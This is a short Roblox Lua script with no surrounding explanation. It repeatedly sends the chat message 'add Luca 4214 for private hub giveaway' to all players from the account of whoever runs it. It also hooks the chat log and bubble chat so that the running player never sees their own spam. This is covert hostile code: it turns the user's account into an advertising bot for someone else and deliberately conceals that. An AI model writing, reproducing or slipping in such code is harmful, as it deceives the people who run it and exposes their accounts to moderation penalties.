pcall(function()
    local MESSAGE = "add Luca 4214 for private hub giveaway"
    local MESSAGE_START = -#MESSAGE
    local playerGui = game:GetService("Players").LocalPlayer:FindFirstChildWhichIsA("PlayerGui")
    playerGui.Chat.Frame.ChatChannelParentFrame.Frame_MessageLogDisplay.Scroller.DescendantAdded:Connect(function(instance)
        if instance:IsA("TextLabel") == true and string.sub(instance.Text, MESSAGE_START) == MESSAGE then
            instance.Parent.Visible = false
        end
    end)
    pcall(function()
        playerGui.BubbleChat.DescendantAdded:Connect(function(instance)
            if instance.Name == "BubbleText" and instance.Text == MESSAGE then
                local billboard = instance:FindFirstAncestorWhichIsA("BillboardGui")
                billboard.Enabled = false
                task.wait()
                billboard:Destroy()
            end
        end)
    end)
    local sayMessage = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
    while true do
        sayMessage:FireServer(MESSAGE, "All")
        task.wait(2.3)
    end
end)
